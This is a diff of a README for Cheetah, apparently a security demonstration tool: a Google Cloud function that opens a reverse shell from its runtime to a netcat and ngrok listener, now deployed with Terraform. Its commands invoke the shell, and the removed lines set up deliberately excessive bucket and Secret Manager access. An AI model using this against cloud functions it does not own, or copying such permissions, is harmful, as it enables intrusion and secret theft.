@@ -5,67 +5,40 @@ Cheetah is a Go function that can be deployed to the Google Cloud Platform to es
 ## Installing Prerequisites
 
 * [Google Cloud SDK](https://cloud.google.com/sdk/install)
-* [Node.js v14.15.4 / NPM](https://nodejs.org/en/download/)
-* [Function Deployment Service Account](https://cloud.google.com/functions/docs/concepts/iam#cloud_functions_service_account)
+* [Go](https://go.dev)
+* [Terraform](https://learn.hashicorp.com/terraform/getting-started/install.html)
 
 ## Deploying The Function
 
-### Serverless Framework
-
-Follow [these steps](https://serverless.com/framework/docs/providers/google/guide/credentials/) to generate a credentials file. Deploy the function by specifying your GCP project ID and the **absolute path** of the credentials file.
-
 ```bash
-cd /PATH/TO/cheetah/src/cheetah
-npm install
-
-# Optional: Create protected storage bucket that the function role has access to.
-export WITH_BUCKET=true
-export BUCKET_SUFFIX=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.
-
-GCP_PROJECT=YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID
-GCP_CREDENTIALS_FILE=/ABSOLUTE/PATH/TO/.gcloud/keyfile.json
-npx serverless deploy
+gcloud auth application-default login
+export TF_VAR_unique_identifier=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}')
+export TF_VAR_project_id=YOUR_PROJECT_ID
+cd ./cougar/src/terraform/
+terraform init
+terraform apply --auto-approve
 ```
 
-In addition to deploying the function, if `WITH_BUCKET=true` and `BUCKET_SUFFIX` is set, this will create a private storage bucket. The function role will have unnecessary permissions to access the bucket.
+## Function Testing
 
-To upload a secret image to the bucket, run the following:
-
-```bash
-gcloud auth activate-service-account --key-file /PATH/TO/.gcloud/keyfile.json
-gsutil cp /PATH/TO/assets/* "gs://cheetah-$BUCKET_SUFFIX"
-```
-
-You can also use Cheetah to demonstrate how a compromised function could be used to access the GCP Secret Manager. In order to set this up:
-
-* Enable "Secret Manager API" in the [API dashboard](https://console.cloud.google.com/apis/dashboard).
-* Recreate your service account and add the "Secret Manager Admin" role.
-* As [the Serverless Framework always uses the App Engine default service account](https://github.com/serverless/serverless-google-cloudfunctions/issues/161), 
-* Run the following:
+Retrieve the Function URL:
 
 ```bash
-gcloud config set project YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID # If you receive a warning like the following, you can just ignore it: WARNING: You do not appear to have access to project [...] or it does not exist.
-
-gcloud secrets create cheetah-database-password --replication-policy automatic
-echo -n 'RG9ncyBhcmUgb3VyIGxpbmsgdG8gcGFyYWRpc2UuIFRoZXkgZG9uJ3Qga25vdyBldmlsIG9yIGplYWxvdXN5IG9yIGRpc2NvbnRlbnQu' | gcloud secrets versions add cheetah-database-password --data-file="-"
-gcloud secrets add-iam-policy-binding cheetah-database-password --member serviceAccount:YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID@appspot.gserviceaccount.com --role roles/secretmanager.secretAccessor
+export CHEETAH_FUNCTION_URL=$(terraform output --json | jq -r '.cheetah_function_url.value')
+export CHEETAH_API_KEY=$(terraform output --json | jq -r '.cheetah_api_key.value')
+curl -H "X-API-Key: $CHEETAH_API_KEY" "$CHEETAH_FUNCTION_URL"
 ```
 
-### Native GCloud Commands
+The result should show an error message indicating required C2 parameters are missing:
 
-To deploy natively without the serverless framework, configure `gcloud` in the Terminal to authentication as the deployment service account. Then, deploy the function.
-
-```bash
-gcloud auth activate-service-account --key-file ~/.gcloud/keyfile.json
-gcloud functions deploy cheetah --entry-point Cheetah --runtime go111 --trigger-http --service-account=YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID@appspot.gserviceaccount.com
+```json
+{"message":"Must provide the host and port for the target TCP server as query parameters."}
 ```
-
-## Testing in GCP
 
 If you have [Netcat](http://netcat.sourceforge.net/) and [ngrok](https://ngrok.com/) installed, you can use this script:
 
 ```bash
-script/cheetah --url-id YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID
+../../../script/prey.sh cheetah --url $CHEETAH_FUNCTION_URL --api-key $CHEETAH_API_KEY
 ```
 
 See [here](../script/USAGE.md) for more details on how to use this script.
@@ -85,7 +58,7 @@ ngrok tcp 4444
 Finally, invoke your function, supplying your connection details:
 
 ```bash
-curl "https://$GCP_REGION-YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID.cloudfunctions.net/Cheetah?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER"
+curl "$CHEETAH_FUNCTION_URL?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER"
 ```
 
 Your listener will now act as a reverse shell for the duration of the function invocation. You can adjust the function timeout in the serverless.yml file.
@@ -93,35 +66,9 @@ Your listener will now act as a reverse shell for the duration of the function i
 ## Teardown
 
 ```bash
-cd /PATH/TO/cheetah/src/cheetah
-export SERVERLESS_CHEETAH_BUCKET=$(gsutil ls gs://sls-cheetah-dev*)
-gsutil rm $SERVERLESS_CHEETAH_BUCKET**
-GCP_PROJECT=YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID
-GCP_CREDENTIALS_FILE=/ABSOLUTE/PATH/TO/.gcloud/keyfile.json
-npx serverless remove
-```
-
-## Linting
-
-```bash
-cd /PATH/TO/cheetah/src/cheetah
-go get -u golang.org/x/lint/golint
-npm run lint
+terraform destroy
 ```
 
 ## Learning More
 
-Read [documentation](docs) on what you can accomplish once you connect to the runtime via Cheetah.
-
-## Serverless Go Template
-
-Creating the original function template using the serverless framework.
-
-```bash
-cd src
-serverless create --template google-go --path cheetah
-```
-
-## Exploring Serverless
-
-Refer to [Serverless Docs](https://serverless.com/framework/docs/providers/google/) for more information.
+Read [documentation](./docs/NOTES.md) on what you can accomplish once you connect to the runtime via Cheetah.
